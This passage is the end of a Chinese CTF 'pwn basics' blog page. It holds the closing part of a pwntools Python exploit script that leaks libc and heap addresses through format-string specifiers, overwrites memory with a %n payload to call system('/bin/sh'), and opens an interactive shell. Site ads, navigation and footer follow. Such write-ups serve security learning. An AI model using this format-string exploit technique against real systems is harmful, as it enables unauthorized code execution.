func_1<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span><span class="token string">'%31$paaaa'</span><span class="token punctuation">)</span>
func_4<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">241</span>
<span class="token keyword">print</span> <span class="token string">&quot;libc_start_main addr :&quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&quot;system&quot;</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'system addr :'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'binsh addr :'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>

payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%6$p%11$pbbb'</span><span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span>binsh<span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
func_1<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
func_4<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Description: '</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bbb'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> data
ebp_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">12</span>
<span class="token keyword">print</span> <span class="token string">'ebp :'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'heap :'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>

p1 <span class="token operator">=</span> <span class="token punctuation">(</span>heap_addr <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>
p2 <span class="token operator">=</span> heap_addr <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">-</span>p1
payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x%'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x%6$n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
func_1<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
func_4<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Description: &quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Description: '</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt;&gt;&gt;'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/WQhCHZg7Vpi98EN.jpg" alt="本地打过.jpg"></p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/xugaoyi/vuepress-theme-vdoing/edit/master/docs/00.Pwn/02.pwn基础.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="tags"><a href="/tags/?tag=pwn" title="标签">#pwn</a><a href="/tags/?tag=ROP" title="标签">#ROP</a></div> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2021/04/20, 16:25:20</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/9bb16d/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">armpwn</div></a> <a href="/pages/3f7933/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">stack-chunk</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/9bb16d/" class="prev">armpwn</a></span> <span class="next"><a href="/pages/3f7933/">stack-chunk</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/38db4a/"><div>带学弟之一起刷tw</div></a> <span>04-26</span></dt></dl><dl><dd>02</dd> <dt><a href="/about/d769bc/"><div>about</div></a> <span>04-20</span></dt></dl><dl><dd>03</dd> <dt><a href="/friends/8107b9/"><div>friend</div></a> <span>04-20</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:1515240194@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/0xshaobai" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://www.zhihu.com/people/yang-yu-ban-tu-dou-43" title="知乎" target="_blank" class="iconfont icon-zhihu"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2021-2021
    <span>Evan Xu | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.9038ce9a.js" defer></script><script src="/assets/js/2.6bd067a5.js" defer></script><script src="/assets/js/7.dc335bce.js" defer></script>
  </body>
</html>